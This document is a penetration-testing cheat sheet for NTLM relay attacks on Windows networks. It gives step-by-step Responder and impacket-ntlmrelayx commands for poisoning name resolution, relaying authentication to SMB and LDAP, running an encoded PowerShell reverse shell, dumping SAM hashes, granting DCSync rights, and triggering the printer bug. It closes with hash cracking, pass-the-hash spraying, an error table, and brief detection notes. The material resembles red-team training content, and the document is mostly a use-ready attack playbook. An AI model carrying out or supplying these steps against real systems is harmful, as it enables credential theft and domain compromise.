# NTLM Relay

NTLM Relay is a man-in-the-middle attack that captures NTLM authentication attempts and forwards them to a target service — authenticating as the victim without ever cracking their password. Unlike Pass-the-Hash which reuses a captured hash, relay attacks use the live authentication handshake in real time.

The core requirement: SMB signing must be disabled or not enforced on the target. Most workstations have it disabled by default. Domain Controllers have it enforced by default.

---

## How It Works

```
Victim machine tries to authenticate to attacker's machine
    → Attacker captures the NTLM challenge/response
    → Attacker forwards it to a real target (e.g., another workstation)
    → Target accepts the authentication — attacker is now authenticated as the victim
```

Triggers that cause NTLM authentication attempts:
- LLMNR/NBT-NS poisoning (victim trying to resolve a hostname)
- Printer bug (SpoolService forcing DC to authenticate back)
- Malicious links in files or emails
- Misconfigured WebDAV or UNC path references

---

## Step 1 — Check SMB Signing on the Network

Only relay to hosts where SMB signing is disabled or not required.

```bash
# CrackMapExec — scan a subnet for SMB signing status
crackmapexec smb <subnet>/24 --gen-relay-list relay_targets.txt

# Nmap — check SMB signing
nmap --script smb2-security-mode -p 445 <subnet>/24

# Output to look for:
# signing: false  → relay target
# signing: true   → cannot relay here
```

---

## Step 2 — Poison LLMNR/NBT-NS with Responder

Responder poisons name resolution requests on the network, causing victims to send NTLM authentication to your machine.

```bash
# Start Responder in analyze mode first to see traffic without poisoning
responder -I eth0 -A

# Start Responder with SMB and HTTP turned OFF
# This is critical — ntlmrelayx needs those ports free
responder -I eth0 -dw

# Or explicitly disable SMB and HTTP
responder -I eth0 --disable-ess -w -d
```

Edit `/etc/responder/Responder.conf` before starting:

```ini
# Set these to Off so ntlmrelayx can use the ports
SMB = Off
HTTP = Off
```

---

## Step 3 — Start ntlmrelayx

Run ntlmrelayx simultaneously with Responder in a separate terminal.

### Basic Relay — Execute a Command

```bash
# Relay to a single target and run a command
impacket-ntlmrelayx -t smb://<target_ip> -c "whoami" -smb2support

# Relay to multiple targets from a file
impacket-ntlmrelayx -tf relay_targets.txt -c "whoami" -smb2support

# Execute a PowerShell reverse shell
impacket-ntlmrelayx -t smb://<target_ip> \
  -c "powershell -enc <base64_payload>" \
  -smb2support
```

### Dump SAM Hashes (No Command Needed)

```bash
# Default behavior — dumps local SAM hashes if relayed user is local admin
impacket-ntlmrelayx -t smb://<target_ip> -smb2support

# Dump from multiple targets
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
```

### Interactive SMB Shell

```bash
# Opens an interactive SMB shell when relay succeeds
impacket-ntlmrelayx -t smb://<target_ip> -smb2support -i

# Connect to the shell on localhost after relay triggers
nc 127.0.0.1 11000
```

### Relay to LDAP — Create a New Admin User

```bash
# Relay NTLM auth to LDAP on the DC
impacket-ntlmrelayx -t ldap://<dc_ip> --escalate-user <your_username>

# Relay to LDAPS
impacket-ntlmrelayx -t ldaps://<dc_ip> --escalate-user <your_username>

# Add a new domain admin
impacket-ntlmrelayx -t ldap://<dc_ip> \
  --add-computer EVILPC \
  --delegate-access
```

### Relay to LDAP — DCSync Rights

```bash
# If you relay a Domain Admin's auth to LDAP, grant DCSync rights to your account
impacket-ntlmrelayx -t ldap://<dc_ip> \
  --escalate-user <your_low_priv_username> \
  -smb2support
```

### Relay with SOCKS Proxy

```bash
# Start ntlmrelayx with SOCKS — maintains persistent authenticated sessions
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks

# After relay triggers, use proxychains to route tools through the session
# Check active SOCKS sessions
socks

# Use proxychains with any impacket tool
proxychains impacket-secretsdump <domain>/<username>@<target_ip> -no-pass
proxychains crackmapexec smb <target_ip> -u <username> -p "" --shares
```

---

## Method 2 — Printer Bug (No User Interaction Required)

Forces a Domain Controller to authenticate back to your machine using the Print Spooler service. Does not require waiting for a victim to browse the network.

```bash
# Check if Print Spooler is running on the DC
impacket-rpcdump <dc_ip> | grep -i spoolsv

# Or using CrackMapExec
crackmapexec smb <dc_ip> -u <username> -p <password> -M spooler
```

```python
# SpoolSample / printerbug.py — trigger DC auth back to your machine
python3 printerbug.py <domain>/<username>:<password>@<dc_ip> <attacker_ip>
```

Combine with ntlmrelayx targeting LDAP to relay the DC's machine account auth:

```bash
# Start relay targeting LDAP — DC machine accounts can modify AD
impacket-ntlmrelayx -t ldap://<dc_ip> --escalate-user <your_username> -smb2support

# Trigger the printer bug in a second terminal
python3 printerbug.py <domain>/<username>:<password>@<dc_ip> <attacker_ip>
```

---

## Method 3 — NTLM Relay to HTTP (WebDAV)

If WebClient service is running on the victim, you can relay HTTP authentication which bypasses SMB signing restrictions entirely.

```bash
# Check if WebClient is running
crackmapexec smb <target> -u <username> -p <password> -M webdav

# Relay HTTP auth to SMB — bypasses SMB signing
impacket-ntlmrelayx -t smb://<target_ip> -smb2support --no-http-server

# Trigger via a UNC path with HTTP
# Place a malicious shortcut or file referencing: http://<attacker_ip>/share
```

---

## Full Attack Example — LAN Relay to SAM Dump

```bash
# Terminal 1 — edit Responder config first
sudo nano /etc/responder/Responder.conf
# Set SMB = Off and HTTP = Off

# Terminal 1 — start Responder
sudo responder -I eth0 -dw

# Terminal 2 — generate relay targets list
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Terminal 2 — start ntlmrelayx
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Wait for a victim to trigger LLMNR/NBT-NS
# ntlmrelayx will automatically dump SAM hashes from each relay target
```

---

## What to Do With Captured Hashes

```bash
# Crack with hashcat (Net-NTLMv2 = mode 5600)
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt

# SAM hashes dumped by ntlmrelayx are NTLM (mode 1000) — can Pass-the-Hash directly
crackmapexec smb <subnet>/24 -u <username> -H <NT_hash> --local-auth

# Spray captured hashes across the network
crackmapexec smb 192.168.1.0/24 -u Administrator -H <NT_hash> --local-auth
```

---

## Common Errors and Fixes

| Error | Cause | Fix |
|---|---|---|
| `SMB SessionError: STATUS_ACCESS_DENIED` | Relayed user is not local admin on target | Target different host or wait for higher-priv user |
| `Connection refused on port 445` | ntlmrelayx not started before Responder | Start ntlmrelayx first |
| `No relay targets` | SMB signing enabled everywhere | Use LDAP relay or WebDAV method |
| `[-] Signing is required` | Target has SMB signing enforced | Switch to LDAP or HTTP relay target |
| Responder captures but ntlmrelayx gets nothing | SMB/HTTP still enabled in Responder config | Edit `/etc/responder/Responder.conf` and set both to Off |

---

## Detection Notes

- Event ID 4624 — logon from unexpected source IP
- Event ID 4648 — explicit credential logon (relay indicator)
- Event ID 4776 — NTLM authentication attempt
- Unusual LDAP modifications shortly after authentication events
- LLMNR and NBT-NS traffic on the network — disable both to prevent poisoning
- Monitor for `ntlmrelayx` tool signatures and abnormal `impacket` user-agent strings in SMB logs